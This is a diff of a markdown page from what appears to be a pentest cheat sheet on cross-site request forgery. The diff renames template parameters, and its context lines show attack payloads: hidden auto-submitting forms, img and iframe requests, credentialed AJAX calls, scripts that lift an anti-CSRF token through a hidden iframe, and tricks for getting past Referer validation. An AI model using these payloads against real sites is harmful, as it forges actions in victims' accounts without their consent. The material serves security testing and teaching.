@@ -18,7 +18,7 @@ the trust that a site has
 in a user's browser.
 [^csrf-cgisecurity]
 
-{{<hint warning>}}
+{{<hint m.ING>}}
 CSRF is not limited to web applications.
 An attacker could embed scripting into
 any document format allowing scripting.
@@ -56,7 +56,7 @@ only under predefined methods.
 For example,
 try changing from `POST` to `GET`.
 
-{{<hint warning>}}
+{{<hint m.ING>}}
 There are cases
 where the method is defined by a parameter
 or a custom header such as:
@@ -89,7 +89,7 @@ Referrer validation may be bypassed by
 hiding its value using the `no-referrer` policy.
 
 ```html
-<a href="http://{{< param "war.rdomain" >}}" rel="noreferrer">
+<a href="http://{{< param "m.RDOMAIN" >}}" rel="noreferrer">
 ```
 
 ### Referer Regex Validation [^referer-bypass]
@@ -118,24 +118,24 @@ file://safe_com
 ### HTML GET - User Interaction
 
 ```html
-<a href="http://{{< param "war.rdomain" >}}/user/update/?username=0xffsec">Click Here!</a>
+<a href="http://{{< param "m.RDOMAIN" >}}/user/update/?username=0xffsec">Click Here!</a>
 ```
 
 ### HTML GET - No Interaction
 
 ```html
-<img src="http://{{< param "war.rdomain" >}}/user/update/?username=0xffsec">
+<img src="http://{{< param "m.RDOMAIN" >}}/user/update/?username=0xffsec">
 ```
 
 ```html
-<iframe src="http://{{< param "war.rdomain" >}}/user/update/?username=0xffsec" style="display:none;"></iframe>
+<iframe src="http://{{< param "m.RDOMAIN" >}}/user/update/?username=0xffsec" style="display:none;"></iframe>
 ```
 
 ### FORM GET - No Interaction
 
 ```html
 <script>history.pushState('', '', '/')</script>
-<form id="csrf_form" method="GET" action="http://{{< param "war.rdomain" >}}/user/update/">
+<form id="csrf_form" method="GET" action="http://{{< param "m.RDOMAIN" >}}/user/update/">
     <input type="hidden" name="username" value="0xffsec" />
     <input type="submit" value="Submit" />
 </form>
@@ -147,7 +147,7 @@ file://safe_com
 ### FORM POST - User Interaction
 
 ```html
-<form action="http://{{< param "war.rdomain" >}}/user/update/" enctype="text/plain" method="POST">
+<form action="http://{{< param "m.RDOMAIN" >}}/user/update/" enctype="text/plain" method="POST">
     <input name="username" type="hidden" value="0xffsec" />
     <input type="submit" value="Submit" />
 </form>
@@ -157,7 +157,7 @@ file://safe_com
 
 ```html
 <script>history.pushState('', '', '/')</script>
-<form id="csrf_form" action="http://{{< param "war.rdomain" >}}/user/update/" enctype="text/plain" method="POST">
+<form id="csrf_form" action="http://{{< param "m.RDOMAIN" >}}/user/update/" enctype="text/plain" method="POST">
     <input name="username" type="hidden" value="0xffsec" />
 </form>
 <script>
@@ -168,7 +168,7 @@ file://safe_com
 ### AJAX GET
 
 ```javascript
-var url = "http://{{< param "war.rdomain" >}}/user/update/?username=0xffsec"
+var url = "http://{{< param "m.RDOMAIN" >}}/user/update/?username=0xffsec"
 var xhr = new XMLHttpRequest();
 xhr.open("GET", url);
 xhr.setRequestHeader("Content-Type", "text/plain");
@@ -178,7 +178,7 @@ xhr.send();
 ### AJAX POST
 
 ```javascript
-var url = "http://{{< param "war.rdomain" >}}/user/update/"
+var url = "http://{{< param "m.RDOMAIN" >}}/user/update/"
 var xhr = new XMLHttpRequest();
 xhr.open("POST", url, true);
 xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
@@ -186,7 +186,7 @@ xhr.send("username=0xffsec");
 ```
 
 ```javascript
-var url = "http://{{< param "war.rdomain" >}}/user/update/"
+var url = "http://{{< param "m.RDOMAIN" >}}/user/update/"
 var xhr = new XMLHttpRequest();
 xhr.open("POST", url, true);
 xhr.withCredentials = true;
@@ -212,13 +212,13 @@ function getToken(){
     console.log(token)
 }
 </script>
-<iframe id="iframe" onload="javascript:getToken();" src="http://{{< param "war.rdomain" >}}/user/update/" style="display:none;"></iframe>
+<iframe id="iframe" onload="javascript:getToken();" src="http://{{< param "m.RDOMAIN" >}}/user/update/" style="display:none;"></iframe>
 ```
 
 ### Get Token with Ajax
 
 ```javascript
-var url = "http://{{< param "war.rdomain" >}}/user/update/"
+var url = "http://{{< param "m.RDOMAIN" >}}/user/update/"
 var xhr = new XMLHttpRequest();
 xhr.responseType = "document";
 xhr.open("GET", url, true);
@@ -250,8 +250,8 @@ function getToken(){
     setTokenAndSend(token)
 }
 </script>
-<iframe id="iframe" onload="javascript:getToken();" src="http://{{< param "war.rdomain" >}}/user/update/" style="display:none;"></iframe>
-<form id="csrf_form" action="http://{{< param "war.rdomain" >}}/user/update/" enctype="text/plain" method="POST">
+<iframe id="iframe" onload="javascript:getToken();" src="http://{{< param "m.RDOMAIN" >}}/user/update/" style="display:none;"></iframe>
+<form id="csrf_form" action="http://{{< param "m.RDOMAIN" >}}/user/update/" enctype="text/plain" method="POST">
     <input name="username" type="hidden" value="0xffsec" />
     <input name="user_token" type="hidden" value="set_by_js" />
 </form>
